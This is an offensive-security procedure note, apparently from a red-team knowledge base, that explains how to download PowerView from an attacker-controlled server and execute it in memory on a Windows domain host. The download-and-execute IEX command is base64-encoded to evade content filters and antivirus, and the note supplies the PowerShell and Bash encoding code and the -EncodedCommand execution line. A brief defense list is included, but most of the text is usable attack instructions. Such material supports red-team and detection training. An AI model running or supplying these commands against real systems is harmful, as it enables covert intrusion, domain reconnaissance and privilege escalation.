---
id: ec8007db-9f27-40c3-91fc-234ec47afc30
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.016370+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Command-and-Scripting-Interpreter/T1059.001|PowerShell]]'
sub_techniques: []
tags:
  - '[[tags/Encoded Commands]]'
  - '[[tags/Powershell]]'
  - ad-recon
commands:
  - '[[commands/powershell-encode-powerview-download]]'
  - '[[commands/bash-encode-powerview-download]]'
  - '[[commands/execute-powerview-via-encodedcommand]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerView]]'
validated: true
---

# Download-and-Execute-PowerView-for-AD-Reconnaissance

## Summary

This procedure outlines how to download and execute the PowerView PowerShell script on a target Windows system for Active Directory reconnaissance and potential privilege escalation. It uses base64 encoding to obfuscate the download command, helping to evade basic content filters and detection mechanisms while leveraging PowerShell's Invoke-Expression (IEX) to load and run the script in memory.

## Description

PowerView is an advanced PowerShell module for enumerating and exploiting Active Directory environments, allowing attackers to discover users, groups, computers, shares, and trust relationships without writing files to disk. In this procedure, the attacker hosts the PowerView.ps1 script on a controlled server (e.g., at http://10.10.10.10/PowerView.ps1) and uses an encoded PowerShell command to download and execute it directly in memory. This avoids antivirus detection from file-based execution and leverages PowerShell's native capabilities for remote code execution. The technique is commonly used post-initial access to map the domain for lateral movement or privilege escalation. It requires outbound internet access from the target and PowerShell v2 or later.

## Requirements

1. Administrative or user-level access to a Windows domain-joined system with PowerShell installed (version 2.0 or higher).
2. Network access from the target to the attacker's controlled server hosting PowerView.ps1 (e.g., HTTP/HTTPS outbound allowed).
3. PowerView.ps1 file uploaded to the attacker's server beforehand.

## Defense

- Enable PowerShell logging (Module, ScriptBlock, and Transcription logging) to capture executed commands and downloads.
- Implement application whitelisting (e.g., AppLocker or WDAC) to restrict unsigned script execution.
- Monitor for anomalous outbound HTTP requests to unusual IPs and base64-encoded PowerShell invocations via EDR tools.
- Use network proxies or firewalls to block unauthorized downloads from external sources.

## Objectives

1. Obfuscate the PowerView download command using base64 encoding to bypass detection.
2. Download and load PowerView into memory on the target system without disk writes.
3. Execute PowerView functions for AD enumeration (e.g., Get-DomainUser, Get-DomainGroup).

## Instructions

### Step 1: Generate Encoded Download Command Using PowerShell

**Context**: Create a base64-encoded version of the IEX download command on the attacker's machine or a staging system. This encoding converts the command to Unicode and base64, which can then be executed via PowerShell's -EncodedCommand parameter. This step prepares the payload for delivery to the target.

**Code** ([[codes/PowerShell-Encode-Download-Command]]):

```ps1
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

**Command** ([[commands/powershell-encode-powerview-download]]):

Run the encoding script to output the base64 string.

> This generates the encoded command string, e.g., 'SQVYK ...' which can be copied for use in Step 3. Verify by decoding it back to confirm the original command.

### Step 2: Alternative - Generate Encoded Download Command Using Bash

**Context**: If on a Linux-based attacker's machine, use Bash to encode the PowerShell command in UTF-16LE and base64 format. This is useful for cross-platform preparation and produces the same encoded string as the PowerShell method.

**Code** ([[codes/Bash-Encode-PowerShell-Download]]):

```ps1
echo 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")' | iconv -t utf-16le | base64 -w 0
```

**Command** ([[commands/bash-encode-powerview-download]]):

Execute the Bash one-liner to output the base64 string.

> This outputs the encoded command without line wraps. Compare with Step 1 output to ensure consistency. Use this string in the execution command.

### Step 3: Execute Encoded Command on Target System

**Context**: On the target Windows system (e.g., via initial access like a compromised account or remote shell), run PowerShell with the -EncodedCommand parameter to download and execute PowerView. This loads the script in memory, allowing immediate use of its cmdlets for reconnaissance.

**Command** ([[commands/execute-powerview-via-encodedcommand]]):

```powershell
powershell.exe -EncodedCommand <BASE64_ENCODED_STRING>
```

> Replace <BASE64_ENCODED_STRING> with the output from Step 1 or 2. Successful execution loads PowerView; test by running Get-DomainUser to enumerate domain users. No file is written to disk, reducing detection risk.
